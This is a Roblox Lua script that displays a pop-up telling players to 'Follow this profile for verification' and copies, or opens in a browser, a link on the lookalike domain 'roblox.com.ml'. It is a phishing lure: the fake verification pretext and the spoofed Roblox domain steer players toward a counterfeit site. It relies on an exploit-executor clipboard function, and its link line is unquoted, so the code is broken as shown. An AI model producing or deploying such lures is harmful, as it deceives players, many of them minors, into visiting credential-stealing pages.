local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UIStroke = Instance.new("UIStroke")
local UIPadding = Instance.new("UIPadding")
local TextLabel = Instance.new("TextLabel")
local CopyButton = Instance.new("TextButton")

ScreenGui.Parent = player:WaitForChild("PlayerGui")

-- FRAME
Frame.Size = UDim2.new(0, 360, 0, 160)
Frame.Position = UDim2.new(0.5, -180, 0.5, -80)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
Frame.BackgroundTransparency = 1
Frame.Parent = ScreenGui

UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = Frame

UIStroke.Thickness = 1
UIStroke.Color = Color3.fromRGB(120, 120, 255)
UIStroke.Transparency = 0.3
UIStroke.Parent = Frame

UIPadding.PaddingTop = UDim.new(0, 12)
UIPadding.PaddingBottom = UDim.new(0, 12)
UIPadding.PaddingLeft = UDim.new(0, 12)
UIPadding.PaddingRight = UDim.new(0, 12)
UIPadding.Parent = Frame

-- TEXT
TextLabel.Size = UDim2.new(1, 0, 0.6, 0)
TextLabel.BackgroundTransparency = 1
TextLabel.Text = "Follow this profile for verification"
TextLabel.TextColor3 = Color3.fromRGB(235, 235, 235)
TextLabel.Font = Enum.Font.GothamMedium
TextLabel.TextSize = 18
TextLabel.TextWrapped = true
TextLabel.Parent = Frame

-- BUTTON
CopyButton.Size = UDim2.new(1, 0, 0.3, 0)
CopyButton.Position = UDim2.new(0, 0, 0.65, 0)
CopyButton.Text = "Copy link"
CopyButton.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyButton.Font = Enum.Font.Gotham
CopyButton.TextSize = 16
CopyButton.Parent = Frame

local link = https://www.roblox.com.ml/users/437740423885/profile

-- ANIMATION IN
TweenService:Create(Frame, TweenInfo.new(0.4), {
	BackgroundTransparency = 0
}):Play()

-- COPY LOGIC
CopyButton.MouseButton1Click:Connect(function()
	CopyButton.Text = "Copied ✓"

	if setclipboard then
		setclipboard(link)
	else
		game:GetService("GuiService"):OpenBrowserWindow(link)
	end

	task.wait(1.5)
	CopyButton.Text = "Copy link"
end)
